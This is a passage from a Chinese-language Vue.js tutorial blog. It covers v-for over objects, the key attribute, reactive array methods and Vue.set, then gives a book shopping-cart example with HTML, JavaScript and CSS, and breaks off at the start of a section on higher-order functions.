href="#v-for遍历对象" class="headerlink" title="v-for遍历对象"></a>v-for遍历对象</h2><p>v-for可以用于遍历对象：比如某个对象中存储着个人信息，我们希望以列表的形式显示出来。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!--1.在遍历对象的过程中, 如果只是获取一个值, 那么获取到的是value--&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;item in info&quot;</span>&gt;</span>&#123;&#123;item&#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">&lt;!--2.获取key和value 格式: (value, key) --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;(value, key) in info&quot;</span>&gt;</span>&#123;&#123;key&#125;&#125;:&#123;&#123;value&#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">&lt;!--3.获取key和value和index 格式: (value, key, index) --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;(value, key, index) in info&quot;</span>&gt;</span>&#123;&#123;index&#125;&#125;.&#123;&#123;key&#125;&#125;:&#123;&#123;value&#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">info</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">name</span>: <span class="string">&#x27;nan&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">age</span>: <span class="number">23</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">height</span>: <span class="number">1.78</span></span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>注意：格式(value, key, index)是有序的。</code></p><h2 id="维护状态-key"><a href="#维护状态-key" class="headerlink" title="维护状态-key"></a>维护状态-key</h2><p>当 Vue 正在更新使用 <code>v-for</code> 渲染的元素列表时，它默认使用“就地更新”的策略。如果数据项的顺序被改变，Vue 将不会移动 DOM 元素来匹配数据项的顺序，而是就地更新每个元素，并且确保它们在每个索引位置正确渲染。</p><blockquote><p>A B C D E</p><p>我们希望可以在B和C之间加一个F，Diff算法默认执行起来是这样的：即把C更新成F，D更新成C，E更新成D，最后再插入E。是不是很没有效率？</p></blockquote><p>为了给 Vue 一个提示，以便它能跟踪每个节点的身份，从而重用和重新排序现有元素，你需要为每项提供一个<strong>唯一</strong> <code>key</code> attribute：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">v-for</span>=<span class="string">&quot;item in items&quot;</span> <span class="attr">v-bind:key</span>=<span class="string">&quot;item.id&quot;</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 内容 --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>建议尽可能在使用 <code>v-for</code> 时提供 <code>key</code> attribute</strong>，除非遍历输出的 DOM 内容非常简单，或者是刻意依赖默认行为以获取性能上的提升。</p><hr><p>key 是 Vue 识别节点的一个通用机制，<code>key</code> 并不仅与 <code>v-for</code> 特别关联。</p><p>不要使用对象或数组之类的非基本类型值作为 <code>v-for</code> 的 <code>key</code>。请用字符串或数值类型的值。</p><p><code>key</code> 的特殊 attribute 主要用在 Vue 的虚拟 DOM 算法，在新旧 nodes 对比时辨识 VNodes。如果不使用 key，Vue 会使用一种最大限度减少动态元素并且尽可能的尝试就地修改&#x2F;复用相同类型元素的算法。而使用 key 时，它会基于 key 的变化重新排列元素顺序，并且会移除 key 不存在的元素。</p><p>有相同父元素的子元素必须有<strong>独特的 key</strong>。重复的 key 会造成渲染错误。它可以用于强制替换元素&#x2F;组件而不是重复使用它。</p><p><strong>key的作用主要是为了高效的更新虚拟DOM。</strong></p><h2 id="检测数组更新"><a href="#检测数组更新" class="headerlink" title="检测数组更新"></a>检测数组更新</h2><p>因为Vue是响应式的，所以当数据发生变化时，Vue会自动检测数据变化，视图会发生对应的更新。</p><p>Vue中包含了一组观察数组编译的方法，使用它们改变数组也会触发视图的更新。</p><ul><li>push()：在数组最后面添加元素</li><li>pop()：删除数组中的最后一个元素</li><li>shift()：删除数组中的第一个元素</li><li>unshift()：在数组最前面添加元素</li><li>splice(index,howmany,item1,…..,itemX)：删除元素&#x2F;插入元素&#x2F;替换元素<ul><li>index：规定添加&#x2F;删除项目的起始位置，使用负数可从数组结尾处规定位置</li><li>删除元素：第二个参数传入你要删除几个元素(如果没有传,就删除 index 后面所有的元素)</li><li>替换元素：第二个参数, 表示我们要替换几个元素, 后面参数是用于替换前面的元素</li><li>插入元素：第二个参数, 传入0, 并且后面跟上要插入的元素</li></ul></li><li>sort()：对数组中的元素进行排序</li><li>reverse()：颠倒数组中元素的顺序</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;item in letters&quot;</span>&gt;</span>&#123;&#123;item&#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;btnClick&quot;</span>&gt;</span>按钮<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">letters</span>: [<span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;d&#x27;</span>]</span></span><br><span class="line"><span class="language-javascript">        &#125;,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">methods</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">btnClick</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="comment">// 1.push方法：在数组最后面添加元素</span></span></span><br><span class="line"><span class="language-javascript">                <span class="comment">// this.letters.push(&#x27;aaa&#x27;)</span></span></span><br><span class="line"><span class="language-javascript">                <span class="comment">// this.letters.push(&#x27;aaaa&#x27;, &#x27;bbbb&#x27;, &#x27;cccc&#x27;)</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">                <span class="comment">// 2.pop(): 删除数组中的最后一个元素</span></span></span><br><span class="line"><span class="language-javascript">                <span class="comment">// this.letters.pop();</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">                <span class="comment">// 3.shift(): 删除数组中的第一个元素</span></span></span><br><span class="line"><span class="language-javascript">                <span class="comment">// this.letters.shift();</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">                <span class="comment">// 4.unshift(): 在数组最前面添加元素</span></span></span><br><span class="line"><span class="language-javascript">                <span class="comment">// this.letters.unshift(&#x27;aaa&#x27;)</span></span></span><br><span class="line"><span class="language-javascript">                <span class="comment">// this.letters.unshift(&#x27;aaa&#x27;, &#x27;bbb&#x27;, &#x27;ccc&#x27;)</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">                <span class="comment">// 5.splice作用: 删除元素/插入元素/替换元素</span></span></span><br><span class="line"><span class="language-javascript">                <span class="comment">// this.letters.splice(0)//删除从index为0开始往后的元素</span></span></span><br><span class="line"><span class="language-javascript">                <span class="comment">// this.letters.splice(0,2)//删除从index为0开始往后的2个元素</span></span></span><br><span class="line"><span class="language-javascript">                <span class="comment">// this.letters.splice(0, 3, &#x27;m&#x27;, &#x27;n&#x27;, &#x27;l&#x27;, &#x27;x&#x27;)//替换从index为0的元素开始往后的3个元素</span></span></span><br><span class="line"><span class="language-javascript">                <span class="comment">// this.letters.splice(1, 0, &#x27;x&#x27;, &#x27;y&#x27;, &#x27;z&#x27;)//在index为1的元素后面追加元素</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">                <span class="comment">// 6.sort()：对数组中的元素进行排序</span></span></span><br><span class="line"><span class="language-javascript">                <span class="comment">// this.letters.sort()</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">                <span class="comment">// 7.reverse()：颠倒数组中元素的顺序</span></span></span><br><span class="line"><span class="language-javascript">                <span class="comment">// this.letters.reverse()</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">                <span class="comment">// 注意: 通过索引值修改数组中的元素并不会响应式地更新视图</span></span></span><br><span class="line"><span class="language-javascript">                <span class="comment">// this.letters[0] = &#x27;bbbbbb&#x27;;</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">                <span class="comment">// 可通过Vue的set(要修改的对象, 索引值, 修改后的值)响应式地更新视图</span></span></span><br><span class="line"><span class="language-javascript">                <span class="title class_">Vue</span>.<span class="title function_">set</span>(<span class="variable language_">this</span>.<span class="property">letters</span>, <span class="number">0</span>, <span class="string">&#x27;bbbbbb&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="阶段案例（书籍购物车）"><a href="#阶段案例（书籍购物车）" class="headerlink" title="阶段案例（书籍购物车）"></a>阶段案例（书籍购物车）</h1><h2 id="index-html"><a href="#index-html" class="headerlink" title="index.html"></a>index.html</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;style.css&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">v-if</span>=<span class="string">&quot;books.length != 0&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">table</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">thead</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">th</span>&gt;</span><span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">th</span>&gt;</span>书籍名称<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">th</span>&gt;</span>出版日期<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">th</span>&gt;</span>价格<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">th</span>&gt;</span>购买数量<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">th</span>&gt;</span>操作<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">thead</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">tbody</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">tr</span> <span class="attr">v-for</span>=<span class="string">&quot;(item,index) in books&quot;</span> <span class="attr">v-if</span>=<span class="string">&quot;item&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">td</span>&gt;</span>&#123;&#123;item.id&#125;&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">td</span>&gt;</span>&#123;&#123;item.name&#125;&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">td</span>&gt;</span>&#123;&#123;item.date&#125;&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">td</span>&gt;</span>&#123;&#123;item.price | showPrice&#125;&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">td</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;decrement(index)&quot;</span> <span class="attr">:disabled</span>=<span class="string">&quot; item.count === 1&quot;</span>&gt;</span>-<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">                    &#123;&#123;item.count&#125;&#125;</span><br><span class="line">                    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;increment(index)&quot;</span>&gt;</span>+<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">td</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;remove(index)&quot;</span>&gt;</span>移除<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">tbody</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h2</span>&gt;</span>总价格为：&#123;&#123;totalPrice | showPrice&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">v-else</span>&gt;</span>购物车为空<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;main.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="main-js"><a href="#main-js" class="headerlink" title="main.js"></a>main.js</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">    <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span><br><span class="line">    <span class="attr">data</span>: &#123;</span><br><span class="line">        <span class="attr">books</span>: [</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="attr">id</span>: <span class="number">1</span>,</span><br><span class="line">                <span class="attr">name</span>: <span class="string">&#x27;《算法导论》&#x27;</span>,</span><br><span class="line">                <span class="attr">date</span>: <span class="string">&#x27;2006-9&#x27;</span>,</span><br><span class="line">                <span class="attr">price</span>: <span class="number">85.00</span>,</span><br><span class="line">                <span class="attr">count</span>: <span class="number">1</span></span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="attr">id</span>: <span class="number">2</span>,</span><br><span class="line">                <span class="attr">name</span>: <span class="string">&#x27;《UNIX编程艺术》&#x27;</span>,</span><br><span class="line">                <span class="attr">date</span>: <span class="string">&#x27;2006-2&#x27;</span>,</span><br><span class="line">                <span class="attr">price</span>: <span class="number">59.00</span>,</span><br><span class="line">                <span class="attr">count</span>: <span class="number">1</span></span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="attr">id</span>: <span class="number">3</span>,</span><br><span class="line">                <span class="attr">name</span>: <span class="string">&#x27;《编程珠玑》&#x27;</span>,</span><br><span class="line">                <span class="attr">date</span>: <span class="string">&#x27;2008-10&#x27;</span>,</span><br><span class="line">                <span class="attr">price</span>: <span class="number">39.00</span>,</span><br><span class="line">                <span class="attr">count</span>: <span class="number">1</span></span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="attr">id</span>: <span class="number">4</span>,</span><br><span class="line">                <span class="attr">name</span>: <span class="string">&#x27;《代码大全》&#x27;</span>,</span><br><span class="line">                <span class="attr">date</span>: <span class="string">&#x27;2006-3&#x27;</span>,</span><br><span class="line">                <span class="attr">price</span>: <span class="number">128.00</span>,</span><br><span class="line">                <span class="attr">count</span>: <span class="number">1</span></span><br><span class="line">            &#125;,</span><br><span class="line">        ]</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">filters</span>: &#123;</span><br><span class="line">        <span class="title function_">showPrice</span>(<span class="params">price</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;¥&#x27;</span> + price.<span class="title function_">toFixed</span>(<span class="number">2</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">computed</span>: &#123;</span><br><span class="line">        <span class="title function_">totalPrice</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">let</span> totalPrice = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="variable language_">this</span>.<span class="property">books</span>.<span class="property">length</span>; i++) &#123;</span><br><span class="line">                totalPrice += <span class="variable language_">this</span>.<span class="property">books</span>[i].<span class="property">count</span> * <span class="variable language_">this</span>.<span class="property">books</span>[i].<span class="property">price</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> totalPrice</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">methods</span>: &#123;</span><br><span class="line">        <span class="title function_">increment</span>(<span class="params">index</span>) &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">books</span>[index].<span class="property">count</span>++</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="title function_">decrement</span>(<span class="params">index</span>) &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">books</span>[index].<span class="property">count</span>--</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="title function_">remove</span>(<span class="params">index</span>) &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">books</span>.<span class="title function_">splice</span>(index, <span class="number">1</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="style-css"><a href="#style-css" class="headerlink" title="style.css"></a>style.css</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">table</span> &#123;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#e9e9e9</span>;</span><br><span class="line">    <span class="attribute">border-collapse</span>: collapse;</span><br><span class="line">    <span class="attribute">border-spacing</span>: <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">th</span>, <span class="selector-tag">td</span> &#123;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">8px</span> <span class="number">16px</span>;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#e9e9e9</span>;</span><br><span class="line">    <span class="attribute">text-align</span>: left;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">th</span> &#123;</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="number">#f7f7f7</span>;</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#5c6b77</span>;</span><br><span class="line">    <span class="attribute">font-weight</span>: <span class="number">600</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="JavaScript高阶函数的使用"><a href="#JavaScript高阶函数的使用" class="headerlink" title="JavaScript高阶函数的使用"></a>JavaScript高阶函数的使用</h1><p>编程范式: 命令式编程&#x2F;声明式编程</p><p>编程范式: 面向对象编程(第一公民:对象)&#x2F;函数式编程(第一公民:函数)</p><p><strong>filter&#x2F;map&#x2F;reduce</strong></p><p>filter中的回调函数有一个要求: 必须返回一个boolean值</p><ul><li><p>true: 当返回true时, 函数内部会自动将这次回调的n加入到新的数组中</p></li><li><p>false: 当返回false时, 函数内部会过滤掉这次的n</p></li></ul><hr><p>传统方式：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> nums = [<span class="number">10</span>, <span class="number">20</span>, <span class="number">111</span>, <span class="number">222</span>, <span class="number">444</span>, <span class="number">40</span>, <span 